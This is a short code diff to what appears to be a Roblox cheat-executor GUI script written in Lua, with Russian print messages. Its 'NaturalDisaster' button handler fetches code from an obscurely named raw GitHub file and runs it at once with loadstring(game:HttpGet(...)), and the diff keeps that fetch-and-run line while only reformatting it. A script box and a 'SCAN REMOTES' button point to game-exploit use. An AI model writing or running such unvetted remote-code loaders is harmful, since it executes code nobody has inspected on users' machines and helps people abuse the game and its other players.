@@ -107,13 +107,10 @@ local function createGUI()
 	end)
 
 	NaturalDisasterButton.MouseButton1Click:Connect(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/antiezteam/-/refs/heads/main/fwwafwfaf"))()
-	end)
-
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/antiezteam/-/refs/heads/main/fwwafwfaf"))()end)
 	ScanButton.MouseButton1Click:Connect(function()
 		print("SCAN REMOTES активирован!")
 	end)
-
 	ScriptBox.FocusLost:Connect(function(enterPressed)
 		if enterPressed then
 			print("Выполняем скрипт: " .. ScriptBox.Text)
